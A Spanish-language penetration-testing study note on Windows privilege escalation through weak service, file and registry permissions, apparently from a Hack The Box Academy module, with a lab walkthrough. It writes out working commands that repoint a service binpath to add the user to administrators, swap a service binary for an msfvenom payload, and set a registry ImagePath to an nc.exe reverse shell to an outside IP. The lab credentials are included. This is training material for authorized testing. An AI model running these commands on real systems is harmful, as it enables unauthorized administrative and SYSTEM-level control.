
# Permisos débiles

Los permisos en los sistemas Windows son complicados y difíciles de conseguir. Una ligera modificación en un lugar puede introducir un fallo en otro. Como pentesters, debemos comprender cómo funcionan los permisos en Windows y las distintas formas en que se pueden aprovechar las configuraciones erróneas para aumentar los privilegios. Los fallos relacionados con los permisos que se analizan en esta sección son relativamente poco comunes en las aplicaciones de software publicadas por grandes proveedores (pero se ven de vez en cuando), pero son comunes en el software de terceros de proveedores más pequeños, el software de código abierto y las aplicaciones personalizadas.&#x20;

Los servicios suelen instalarse con privilegios de SYSTEM, por lo que aprovechar un fallo relacionado con los permisos de un servicio a menudo puede llevar al control total del sistema de destino. Independientemente del entorno, siempre debemos comprobar si hay permisos débiles y poder hacerlo tanto con la ayuda de herramientas como de forma manual en caso de que nos encontremos en una situación en la que no tengamos nuestras herramientas disponibles.

***

## <mark style="color:purple;">Listas de control de acceso (ACL) de sistemas de archivos permisivos</mark>

#### **Ejecutando SharpUp**

Podemos utilizar [SharpUp](https://github.com/GhostPack/SharpUp/) del conjunto de herramientas GhostPack para verificar si hay binarios de servicio que tengan ACL débiles.

```powershell
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```

La herramienta identifica el `PC Security Management Service`, que ejecuta el binario `SecurityService.exe` cuando se inicia.

**Comprobación de permisos con icacls**

Usando [icacls](https://ss64.com/nt/icacls.html) podemos verificar la vulnerabilidad y ver que a los grupos `EVERYONE` y `BUILTIN\Users` se les han otorgado permisos completos al directorio y, por lo tanto, cualquier usuario del sistema sin privilegios puede manipular el directorio y su contenido.

```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**Reemplazo de binario de servicio**

Este servicio también lo pueden iniciar usuarios sin privilegios, por lo que podemos hacer una copia de seguridad del binario original y reemplazarlo con un binario malicioso generado con `msfvenom`. Puede brindarnos un reverse shell como `SYSTEM`, o agregar un usuario administrador local y brindarnos control administrativo total sobre la máquina.

```cmd-session
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

***

### <mark style="color:purple;">1. Permisos de servicio débiles</mark>

#### **Revisando nuevamente SharpUp**

Verifiquemos nuevamente la salida de `SharpUp` para ver si hay servicios modificables. Vemos que es posible que `WindscribeService` esté mal configurado.

```powershell
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

#### **Comprobación de permisos con AccessChk**

A continuación, utilizaremos [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) de la suite Sysinternals para enumerar los permisos del servicio. Los indicadores que utilizamos, en orden, son `-q`(omitir banner), `-u`(suprimir errores), `-v`(verbose), `-c`(especificar el nombre de un servicio de Windows) y `-w`(mostrar solo objetos que tienen acceso de escritura). Aquí podemos ver que todos los usuarios autenticados tienen derechos [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sobre el servicio, lo que significa control total de lectura y escritura sobre él.

```cmd-session
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

#### **Comprobar el grupo de administración local**

Al verificar el grupo de administradores locales se confirma que nuestro usuario `htb-student` no es miembro.

```powershell
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

#### **Cambiar la ruta binaria del servicio**

Podemos usar nuestros permisos para cambiar la ruta binaria de forma maliciosa. Cambiémosla para agregar a nuestro usuario al grupo de administradores locales. Podríamos configurar la ruta binaria para ejecutar cualquier comando o ejecutable que elijamos (como un reverse shell).

```powershell
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

#### **Detención del servicio**

A continuación, debemos detener el servicio, para que el nuevo comando `binpath` se ejecute la próxima vez que se inicie.

```powershell
C:\htb> sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```

#### **Iniciando el servicio**

Dado que tenemos control total sobre el servicio, podemos iniciarlo nuevamente y el comando que colocamos en el `binpath` se ejecutará aunque se devuelva un mensaje de error. El servicio no se inicia porque el `binpath` no apunta al ejecutable del servicio real. Aún así, el ejecutable se ejecutará cuando el sistema intente iniciar el servicio antes de generar un error y detener el servicio nuevamente, ejecutando cualquier comando que especifiquemos en el `binpath`.

```powershell
C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```

#### **Confirmación de la incorporación al grupo de administradores locales**

Por último, verifique que nuestro usuario haya sido agregado al grupo de administradores locales.

```cmd-session
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.
```

Otro ejemplo notable es el Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works) , que se encarga de descargar e instalar actualizaciones del sistema operativo. Se considera un servicio esencial de Windows y no se puede eliminar. Dado que es responsable de realizar cambios en el sistema operativo mediante la instalación de actualizaciones de seguridad y funciones, se ejecuta como la cuenta todopoderosa `NT AUTHORITY\SYSTEM`. Antes de instalar el parche de seguridad relacionado con [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322) , era posible elevar los privilegios de una cuenta de servicio a `SYSTEM`. Esto se debía a permisos débiles, que permitían a las cuentas de servicio modificar la ruta binaria del servicio e iniciar/detener el servicio.

***

### <mark style="color:purple;">2. Permisos de servicio débiles: limpieza</mark>

Podemos limpiar después de nosotros y asegurarnos de que el servicio esté funcionando correctamente deteniéndolo y restableciendo la ruta binaria al ejecutable del servicio original.

#### **Revirtiendo la ruta binaria**

```powershell
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] ChangeServiceConfig SUCCESS
```

#### **Reiniciando el servicio**

Si todo va según lo previsto, podremos reiniciar el servicio sin problemas.

```powershell
C:\htb> sc start WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1716
        FLAGS              :
```

#### **Verificando que el servicio se esté ejecutando**

Al consultar el servicio se mostrará que se está ejecutando nuevamente según lo previsto.

```powershell
C:\htb> sc query WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  Running
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

***

### <mark style="color:purple;">3. Ruta de servicio sin comillas</mark>

Cuando se instala un servicio, la configuración del registro especifica una ruta al binario que se debe ejecutar al iniciar el servicio. Si este binario no está encapsulado entre comillas, Windows intentará ubicarlo en carpetas diferentes. Tome la ruta binaria de ejemplo que se muestra a continuación.

#### **Ruta binaria del servicio**

```shell-session
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows decidirá el método de ejecución de un programa en función de su extensión de archivo, por lo que no es necesario especificarla. Windows intentará cargar los siguientes ejecutables potenciales en orden al iniciar el servicio, lo que implica que es un archivo .exe:

* `C:\Program`
* `C:\Program Files`
* `C:\Program Files (x86)\System`
* `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

**Servicio de consulta**

```powershell
C:\htb> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Si podemos crear los siguientes archivos, podremos secuestrar el binario del servicio y obtener la ejecución del comando en el contexto del servicio, en este caso, `NT AUTHORITY\SYSTEM`.

* `C:\Program.exe\`
* `C:\Program Files (x86)\System.exe`

Sin embargo, la creación de archivos en la raíz de la unidad o en la carpeta de archivos de programa requiere privilegios administrativos. Incluso si el sistema se hubiera configurado incorrectamente para permitir esto, el usuario probablemente no podría reiniciar el servicio y dependería de un reinicio del sistema para aumentar los privilegios. Aunque no es raro encontrar aplicaciones con rutas de servicio sin comillas, no suele ser un problema explotable.

#### **Búsqueda de rutas de servicio sin comillas**

Podemos identificar rutas binarias de servicio sin comillas usando el siguiente comando.

```powershell
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto
```

***

## <mark style="color:purple;">Listas de control de acceso (ACL) de registro permisivas</mark>

También vale la pena buscar ACL de servicios débiles en el Registro de Windows. Podemos hacerlo usando `accesschk`.

#### **Comprobación de ACL de servicios débiles en el registro**

```powershell
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS

<SNIP> 
```

#### **Cambiar la ruta de la imagen con PowerShell**

Podemos abusar de esto usando el cmdlet de PowerShell `Set-ItemProperty`para cambiar el `ImagePath`valor, usando un comando como:

```powershell
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

***

### <mark style="color:purple;">1. Binario de ejecución automática del registro modificable</mark>

**Comprobar programas de inicio**

Podemos utilizar WMIC para ver qué programas se ejecutan al iniciar el sistema. Supongamos que tenemos permisos de escritura en el registro para un binario determinado o que podemos sobrescribir un binario que figura en la lista. En ese caso, es posible que podamos escalar privilegios a otro usuario la próxima vez que el usuario inicie sesión.

```powershell
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware VM3DService Process
command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```

Esta [publicación](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) y [este sitio](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2) detallan muchas posibles ubicaciones de ejecución automática en los sistemas Windows.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.44 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "htb-student" y la contraseña "HTB_@cademy_stdnt!"
```

> Aumente los privilegios en el host de destino utilizando las técnicas que se muestran en esta sección. Envíe el contenido de la flag en la carpeta `WeakPerms` en el escritorio del administrador.

#### Herramientas disponibles

No podemos iniciar Powershell como admin ya que nos pide contraseña de administrador. Seguiremos como un usuario normal.

```powershell
PS C:\tools> ls

    Directory: C:\tools

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/25/2021  12:03 PM                PSSQLite
d-----         5/25/2021  12:03 PM                PSSQLite-master
-a----         4/13/2021   2:01 PM        1378688 accesschk.exe
-a----          8/6/2021   2:10 PM            781 Druva.ps1
-a----         4/13/2021   1:36 PM         494860 PowerUp.ps1
-a----         3/24/2021   5:18 PM         544256 Seatbelt.exe
-a----         3/24/2021   5:44 PM         739328 SharpChrome.exe
-a----         3/24/2021   5:45 PM          26112 SharpUp.exe
-a----         3/25/2021   8:22 AM          27136 Watson.exe
```

#### SharpUp Audit

Vemos que es posible que `WindscribeService` esté mal configurado.

```powershell
PS C:\tools> ./SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

#### **Comprobación de permisos con AccessChk**

Podemos ver que todos los usuarios autenticados tienen derechos [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sobre el servicio, lo que significa control total de lectura y escritura sobre él.

```powershell
PS C:\tools> ./accesschk.exe /accepteula -quvcw WindscribeService

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

#### **Comprobar el grupo de administradores local**

Al verificar el grupo de administradores locales se confirma que nuestro usuario `htb-student` no es miembro.

```powershell
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

#### **Cambiar la ruta binaria del servicio**

Podemos usar nuestros permisos para cambiar la ruta binaria de forma maliciosa desde un CMD. Cambiémosla para agregar a nuestro usuario al grupo de administradores locales. Podríamos configurar la ruta binaria para ejecutar cualquier comando o ejecutable que elijamos (como un reverse shell).

```powershell
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

#### Reiniciar el servicio  y reiniciar equipo

```powershell
C:\htb> sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```

Dado que tenemos control total sobre el servicio, podemos iniciarlo nuevamente y el comando que colocamos en el `binpath` se ejecutará aunque se devuelva un mensaje de error.&#x20;

```powershell
C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```

Una vez hecho esto reiniciamos el equipo y volvemos a acceder para que se apliquen los cambios:

```
logoff
```

#### **Confirmación de la incorporación al grupo de administradores locales**

Verificamos que nuestro usuario ha sido agregado al grupo de administradores locales.

```powershell
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.
```

#### Acceso a la flag

Abrimos una Powershell como administrador ya que no nos pide contraseña por estar dentro del grupo Administrators y ya podríamos acceder a la flag:

```powershell
PS C:\Users\Administrator\Desktop\WeakPerms> type flag.txt
Aud1t_th0se_******************
```
